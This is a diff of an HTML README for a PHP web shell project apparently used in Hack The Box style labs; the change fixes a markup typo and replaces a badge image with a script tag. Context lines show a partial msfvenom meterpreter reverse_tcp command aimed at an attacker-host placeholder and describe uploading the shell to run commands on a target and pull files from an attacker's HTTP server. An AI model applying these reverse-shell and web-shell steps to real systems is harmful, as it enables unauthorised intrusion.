@@ -33,7 +33,7 @@ venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACK
 <p>Once the nsscmdshell is uploaded, typing valid commands into the command input or clicking the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.</p>
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png" />
 
-<h6>The upload and download options are self explanatory, but just to avoid any confusion: </h6>>
+<h6>The upload and download options are self explanatory, but just to avoid any confusion: </h6>
 
 <p>If using the select field, choose your file and click "upload". Files linked in the select field options need to be present at the web root at the ip address and port in lines 10 and 11 of nsscmdshell.php.<sup>1</sup> </p>
 
@@ -60,4 +60,5 @@ It goes without saying that the effectiveness of the various functions depends o
 <code>python3 -m http.server 8000</code>.<br>
 <br>
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png" /></p>
-<img src="http://www.hackthebox.eu/badge/image/476578" alt="Hack The Box">
+<script src="https://www.hackthebox.eu/badge/476578"></script>
+<noscript><img src="http://www.hackthebox.eu/badge/image/476578" alt="Hack The Box"></noscript>
